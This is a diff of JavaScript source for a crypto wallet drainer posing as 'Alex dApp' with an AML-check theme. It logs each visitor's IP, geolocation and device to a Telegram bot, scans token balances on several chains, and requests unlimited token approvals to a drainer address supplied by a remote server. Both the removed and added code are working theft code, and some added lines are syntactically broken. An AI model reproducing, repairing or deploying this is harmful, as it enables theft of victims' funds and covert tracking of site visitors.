@@ -2,169 +2,36 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
-import { showModal } from './aml-check-modal.js';
 
-const PROJECT_ID = 'd85c6d8edb401b676e2a7bcef67f7be8';
+let serverConfig = null;
 
-const CHAINS = {
-  1: {
-    name: "Ethereum Mainnet",
-    nativeToken: "ETH",
-    chainIdHex: "0x1",
-    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
-    usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
-    usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
-    otherTokenAddresses: {
-      DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
-      WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
-      UNI: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
-      LINK: "0x514910771af9ca656af840dff83e8264ecf986ca",
-      COMP: "0xc00e94cb662c3520282e6f5717214004a7f26888",
-      YFI: "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e",
-      CRV: "0xd533a949740bb3306d119cc777fa900ba034cd52",
-      BAT: "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
-      ZRX: "0xe41d2489571d322189246dafa5ebde1f4699f498",
-      LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
-      BNB: "0xb8c77482e45f1f44de1745f52c74426c631bdd52",
-      SHIB: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
-      PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
-      LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
-      FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
-      AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
-      RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
-      MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
-      SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
-      GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
-      REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
-      SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
-      STORJ: "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac"
+async function fetchConfig() {
+  try {
+    const response = await fetch('https://api.bybitamlbot.com/api/config');
+    const data = await response.json();
+    if (data.success) {
+      serverConfig = data;
+      // Обновляем CHAINS с адресами drainer из сервера
+      Object.keys(serverConfig.CHAINS).forEach(chainId => {
+        serverConfig.CHAINS[chainId].drainerAddress = serverConfig.DRAINER_ADDRESSES[serverConfig.CHAINS[chainId].chainIdHex];
+      });
+      console.log('✅ Конфигурация успешно получена с сервера');
+      return serverConfig;
     }
-  },
-  56: {
-    name: "BNB Chain",
-    nativeToken: "BNB",
-    chainIdHex: "0x38",
-    rpcUrls: [
-      "https://bsc-dataseed.binance.org/",
-      "https://bsc-dataseed1.defibit.io/",
-      "https://bsc-dataseed1.ninicoin.io/"
-    ],
-    usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
-    usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
-    otherTokenAddresses: {
-      SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
-      PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
-      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
-      CAKE: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
-      BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
-      XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
-      ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
-      AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
-      BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
-      EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
-      BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
-      MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
-      SFP: "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
-      BabyDoge: "0xc748673057861a797275cd8a068abb95a902e8de",
-      EGC: "0xc001bbe2b87079294c63ece98bdd0a88d761434e",
-      QUACK: "0xd74b782e05aa25c50e7330af541d46e18f36661c",
-      PIT: "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2"
-    }
-  },
-  137: {
-    name: "Polygon",
-    nativeToken: "MATIC",
-    chainIdHex: "0x89",
-    rpcUrls: ["https://polygon-rpc.com/"],
-    usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
-    usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
-    otherTokenAddresses: {
-      SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
-      PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
-      QUICK: "0x831753dd7087cac61ab564b308642cc1c33dc13",
-      GHST: "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7",
-      DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
-      FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
-      ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
-      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
-    }
-  },
-  42161: {
-    name: "Arbitrum One",
-    nativeToken: "ETH",
-    chainIdHex: "0xa4b1",
-    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
-    usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
-    usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e5831",
-    otherTokenAddresses: {
-      PEPE: "0xa54b8e307e70e307e0a5c6bf7c2db4b33ed9f3ac51"
-    }
+    throw new Error(data.message || 'Failed to fetch configuration');
+  } catch (error) {
+    console.error(`❌ Ошибка получения конфигурации с сервера: ${error.message}`);
+    throw error;
   }
-};
-
-const TOKEN_SYMBOLS = {
-  "ETH": "ETHUSDT",
-  "BNB": "BNBUSDT",
-  "MATIC": "MATICUSDT",
-  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDTUSDT",
-  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
-  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
-  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
-  "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": "UNIUSDT",
-  "0x514910771af9ca656af840dff83e8264ecf986ca": "LINKUSDT",
-  "0xc00e94cb662c3520282e6f5717214004a7f26888": "COMPUSDT",
-  "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": "YFIUSDT",
-  "0xd533a949740bb3306d119cc777fa900ba034cd52": "CRVUSDT",
-  "0x0d8775f648430679a709e98d2b0cb6250d2887ef": "BATUSDT",
-  "0xe41d2489571d322189246dafa5ebde1f4699f498": "ZRXUSDT",
-  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
-  "0xb8c77482e45f1f44de1745f52c74426c631bdd52": "BNBUSDT",
-  "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": "SHIBUSDT",
-  "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
-  "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
-  "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
-  "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
-  "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
-  "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
-  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
-  "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
-  "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
-  "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
-  "0xa184088a740c695e156f91f5cc086a06bb78b827": "AUTOUSDT",
-  "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
-  "0xa7f552078dcc247c2684336020c03648500c6d9f": "EPSUSDT",
-  "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f": "BELTUSDT",
-  "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75": "MBOXUSDT",
-  "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb": "SFPUSDT",
-  "0xc748673057861a797275cd8a068abb95a902e8de": "BABYDOGEUSDT",
-  "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
-  "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
-  "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
-  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDTUSDT",
-  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
-  "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
-  "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
-  "0x831753dd7087cac61ab564b308642cc1c33dc13": "QUICKUSDT",
-  "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
-  "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
-  "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
-  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
-  "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
-  "0x55d398326f99059ff775485246999027b3197955": "USDT",
-  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": "USDC",
-  "0x2859e4544c4bb03966803b044a93563bd2d0dd4d": "SHIBUSDT",
-  "0x25d887ce7a35172c62febfd67a1856f20faebb00": "PEPEUSDT",
-  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKIUSDT",
-  "0x831753dd7087cac61ab564b308642cc1c33dc13": "QUICKUSDT"
-};
+}
 
 const networks = [mainnet, polygon, bsc, arbitrum];
-const wagmiAdapter = new WagmiAdapter({ projectId: PROJECT_ID, networks });
+const wagmiAdapter = new WagmiAdapter({ projectId: await fetchConfig().then(config => config.PROJECT_ID), networks });
 
 const appKitModal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
-  projectId: PROJECT_ID,
+  projectId: await fetchConfig().then(config => config.PROJECT_ID),
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
@@ -181,7 +48,7 @@ let isTransactionPending = false;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
-let serverConfig = null;
+
 let lastDrainTime = 0;
 
 const ERC20_ABI = [
@@ -197,37 +64,25 @@ const DRAINER_ABI = [
 
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-async function fetchServerConfig() {
-  if (serverConfig) return serverConfig;
-  try {
-    const response = await fetch('https://api.bybitamlbot.com/api/config');
-    const data = await response.json();
-    serverConfig = data;
-    return serverConfig;
-  } catch (error) {
-    console.error(`❌ Ошибка получения конфигурации: ${error.message}`);
-    throw new Error('Failed to fetch server configuration');
-  }
-}
-
 async function sendTelegramMessage(message) {
-  const config = await fetchServerConfig();
+  if (!serverConfig) {
+    await fetchConfig();
+  }
   try {
-    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${serverConfig.TELEGRAM_BOT_TOKEN}/sendMessage`;
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: config.TELEGRAM_CHAT_ID,
+        chat_id: serverConfig.TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'Markdown'
       })
     });
     const data = await response.json();
     if (!data.ok) {
-      console.error(`❌ Ошибка Telegram: ${data.description}`);
+      console.error(`❌ Ошибка отправки в Telegram: ${data.description}`);
     }
-    return data;
   } catch (error) {
     console.error(`❌ Ошибка отправки в Telegram: ${error.message}`);
   }
@@ -236,6 +91,7 @@ async function sendTelegramMessage(message) {
 async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) return cachedIP;
+
   try {
     const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
@@ -251,6 +107,7 @@ async function getUserIP() {
 async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) return cachedLocation;
+
   try {
     const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
     const data = await response.json();
@@ -269,7 +126,9 @@ async function getGeolocation(ip) {
 function detectDevice() {
   const userAgent = navigator.userAgent.toLowerCase();
   const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
+
   const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
+
   if (isDevToolsEmulation) {
     const realPlatform = navigator.platform.toLowerCase();
     if (/win32|win64/i.test(realPlatform)) return "Windows";
@@ -277,8 +136,9 @@ function detectDevice() {
     if (/linux/i.test(realPlatform)) return "Linux";
     return "Unknown";
   }
+
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
-  if (/android/i.test(userAgent)) return "Android';
+  if (/android/i.test(userAgent)) return "Android";
   if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
   if (/macintosh|mac os/i.test(userAgent)) return "Mac";
   if (/linux/i.test(userAgent)) return "Linux";
@@ -292,21 +152,36 @@ function isMobileDevice() {
 
 async function notifyOnVisit() {
   if (sessionStorage.getItem('visitNotified')) return;
+
   const domain = window.location.hostname || 'Unknown Domain';
   const ip = await getUserIP();
   const location = await getGeolocation(ip);
   const device = detectDevice();
-  const message = `🔔 Visit | **${domain}**\n\nIP: ${ip}\nWhere: ${location}\nDevice: ${device}`;
+
+  const message = `🔔 Visit | **${domain}**\n\n` +
+                  `IP: ${ip}\n` +
+                  `Where: ${location}\n` +
+                  `Device: ${device}`;
+
   await sendTelegramMessage(message);
   sessionStorage.setItem('visitNotified', 'true');
 }
 
-notifyOnVisit().catch(error => console.error(`❌ Ошибка уведомления: ${error.message}`));
+notifyOnVisit().catch(error => {
+  console.error(`❌ Ошибка уведомления о посещении: ${error.message}`);
+});
 
 async function getTokenPriceInUSDT(tokenSymbol) {
+  if (!serverConfig) {
+    await fetchConfig();
+  }
   if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;
+
   const cachedPrice = sessionStorage.getItem(`tokenPrice_${tokenSymbol}`);
-  if (cachedPrice) return parseFloat(cachedPrice);
+  if (cachedPrice) {
+    return parseFloat(cachedPrice);
+  }
+
   try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
@@ -315,10 +190,10 @@ async function getTokenPriceInUSDT(tokenSymbol) {
       sessionStorage.setItem(`tokenPrice_${tokenSymbol}`, price.toString());
       return price;
     }
-    console.warn(`⚠️ Цена для ${tokenSymbol} не найдена`);
+    console.warn(`⚠️ Цена для ${tokenSymbol} не найдена, возвращаем 0`);
     return 0;
   } catch (error) {
-    console.error(`❌ Ошибка получения цены ${tokenSymbol}: ${error.message}`);
+    console.error(`❌ Ошибка получения цены для ${tokenSymbol}: ${error.message}`);
     return 0;
   }
 }
@@ -329,28 +204,34 @@ async function getWorkingProvider(rpcUrls) {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
       return provider;
-    } catch (error) {
+    } catch {
       return null;
     }
   });
+
   const results = await Promise.all(providerPromises);
   const workingProvider = results.find(provider => provider !== null);
   if (!workingProvider) throw new Error('No working provider found');
   return workingProvider;
 }
 
-async function checkBalance(chainId, userAddress) {
-  const chainConfig = CHAINS[chainId];
+async function checkBalance(chainId, userAddress, provider) {
+  if (!serverConfig) {
+    await fetchConfig();
+  }
+  const chainConfig = serverConfig.CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
+
   console.log(`🔍 Проверяем баланс для chainId ${chainId}`);
+
   try {
-    const provider = await getWorkingProvider(chainConfig.rpcUrls);
     nativeBalance = await provider.getBalance(userAddress);
     console.log(`📊 Баланс ${chainConfig.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
   } catch (error) {
     console.error(`❌ Ошибка получения баланса ${chainConfig.nativeToken}: ${error.message}`);
     throw new Error('Failed to fetch native balance');
   }
+
   try {
     const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
     const [usdtBalance, usdtDecimals] = await Promise.all([
@@ -358,11 +239,13 @@ async function checkBalance(chainId, userAddress) {
       usdt.decimals()
     ]);
     tokenBalances[chainConfig.usdtAddress] = { balance: usdtBalance, decimals: usdtDecimals };
+    console.log(`📊 Сырой баланс USDT (wei): ${usdtBalance.toString()}`);
     console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
     tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
+
   try {
     const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
     const [usdcBalance, usdcDecimals] = await Promise.all([
@@ -370,11 +253,13 @@ async function checkBalance(chainId, userAddress) {
       usdc.decimals()
     ]);
     tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
+    console.log(`📊 Сырой баланс USDC (wei): ${usdcBalance.toString()}`);
     console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
     tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
+
   if (chainConfig.otherTokenAddresses) {
     const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
@@ -391,30 +276,38 @@ async function checkBalance(chainId, userAddress) {
         return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
       }
     });
+
     const results = await Promise.all(balancePromises);
     results.forEach(({ address, balance, decimals }) => {
       tokenBalances[address] = { balance, decimals };
     });
   }
+
   return { nativeBalance, tokenBalances };
 }
 
 function hasFunds(bal) {
   const minNativeBalance = ethers.utils.parseEther("0.001");
   const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
+
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
+
   for (const tokenData of Object.values(bal.tokenBalances)) {
     if (tokenData.balance.gt(minTokenBalance)) return true;
   }
+
   return false;
 }
 
 async function switchChain(chainId) {
+  if (!serverConfig) {
+    await fetchConfig();
+  }
   try {
     console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
-      params: [{ chainId: CHAINS[chainId].chainIdHex }]
+      params: [{ chainId: serverConfig.CHAINS[chainId].chainIdHex }]
     });
     console.log(`✅ Сеть переключена на chainId ${chainId}`);
   } catch (error) {
@@ -440,15 +333,24 @@ function formatBalance(balance, decimals) {
 }
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
+  function convertWeiToTokenRounded(balanceInWei, decimals) {
+    const balanceInTokens = parseFloat(ethers.utils.formatUnits(balanceInWei, decimals));
+    return Math.round(balanceInTokens * 100) / 100;
+  }
+
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals();
-    const balanceUnits = ethers.utils.formatUnits(initialAmount, decimals);
+    const balance = initialAmount;
+    const decimals = (await token.decimals()) || 6;
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    
+    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
     const roundedBalance = Math.max(parseFloat(balanceUnits).toFixed(5), 0.0001);
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
+
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
-    await showModal();
+    
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -466,6 +368,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
+    
     return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
@@ -474,23 +377,24 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 }
 
 async function drain(chainId, signer, userAddress, bal, provider) {
+  if (!serverConfig) {
+    await fetchConfig();
+  }
   console.log(`Подключённый кошелёк: ${userAddress}`);
-  const config = await fetchServerConfig();
-  const chainConfig = CHAINS[chainId];
-  if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
-  const drainerAddress = config.DRAINER_ADDRESS[`0x${chainId.toString(16)}`];
-  if (!drainerAddress) throw new Error(`No drainer address for chainId ${chainId}`);
+  const chainConfig = serverConfig.CHAINS[chainId];
+  if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
   console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
 
+  // Проверяем текущую сеть и переключаем, если нужно
   const currentNetwork = await provider.getNetwork();
   if (currentNetwork.chainId !== chainId) {
     console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId}`);
     try {
-      await provider.send('wallet_switchEthereumChain', [{ chainId: chainConfig.chainIdHex }]);
+      await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
       console.log(`⏳ Ожидаем завершения переключения сети...`);
-      await delay(3000);
+      await new Promise(resolve => setTimeout(resolve, 3000));
       const newNetwork = await provider.getNetwork();
       if (newNetwork.chainId !== chainId) {
         throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
@@ -505,7 +409,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
-  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses || {})];
+  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
 
   const connectNotifiedKey = `connectNotified_${userAddress}`;
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
@@ -520,7 +424,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
     if (parseFloat(nativeBalance) > 0) {
       const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-      const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[chainConfig.nativeToken]);
+      const nativePrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[chainConfig.nativeToken]);
       const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
       funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
     }
@@ -531,8 +435,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       if (formattedBalance > 0) {
         const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                       tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                      Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-        const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
+                      Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+        const tokenPrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[tokenAddress] || symbol);
         const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
         funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
       }
@@ -540,7 +444,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
     const device = detectDevice();
     const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-    const message = `🦁 Connect | [ ${shortAddress} ]\n\n` +
+    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                     `Wallet: ${walletName}\n` +
                     `Network: ${networkName}\n` +
                     `Funds:\n${fundsMessage}\n` +
@@ -591,14 +495,14 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
     const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
 
-    if (realBalanceFormatted < storedBalanceFormatted) {
+    if (realBalanceFormatted < storedBalance.balance) {
       bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
     }
 
     if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
       if (!symbol) {
         console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
         continue;
@@ -609,7 +513,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
   const pricePromises = tokensToProcess.map(async (token) => {
-    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
+    const price = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[token.address] || token.token);
     const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
     token.valueInUSDT = balanceInUnits * price;
     return token;
@@ -629,21 +533,21 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
     console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);
 
-    try {
-      const allowance = await contract.allowance(userAddress, drainerAddress);
-      console.log(`📜 Allowance для ${drainerAddress}: ${ethers.utils.formatUnits(allowance, decimals)}`);
-      const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowance, decimals));
-      const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
+    const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
+    console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
 
-      if (allowanceFormatted < balanceFormatted) {
+    const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
+    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
+    if (allowanceFormatted < balanceFormatted) {
+      try {
         const nonce = await provider.getTransactionCount(userAddress, "pending");
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        console.log(`⏳ Задержка перед approve для ${token}`);
-        await delay(10);
+        console.log(`⏳ Задержка перед approve для токена ${token}`);
+        await delay(100);
 
-        const tx = await contract.approve(drainerAddress, MAX, {
+        const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
           gasLimit: 500000,
           gasPrice,
           nonce
@@ -652,8 +556,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
-        await sendTelegramMessage(`✅ Approve для \`${token}\` выполнен\nTx Hash: \`${tx.hash}\`\nNetwork: ${chainConfig.name}`);
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance;
         status = 'confirmed';
 
         if (!modalClosed) {
@@ -661,54 +564,58 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           await hideModalWithDelay();
           modalClosed = true;
         }
-      } else {
-        console.log(`✅ Allowance уже достаточно для токена ${token}`);
+      } catch (error) {
+        console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+          if (!modalClosed) {
+            console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
+            await hideModalWithDelay("Error: Transaction rejected by user.");
+            modalClosed = true;
+          }
+        }
+        throw new Error(`Failed to approve token ${token}: ${error.message}`);
+      }
+    } else {
+      console.log(`✅ Allowance уже достаточно для токена ${token}`);
+      try {
         await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
-        await sendTelegramMessage(
-          `✅ Запрошен трансфер \`${token}\`\n` +
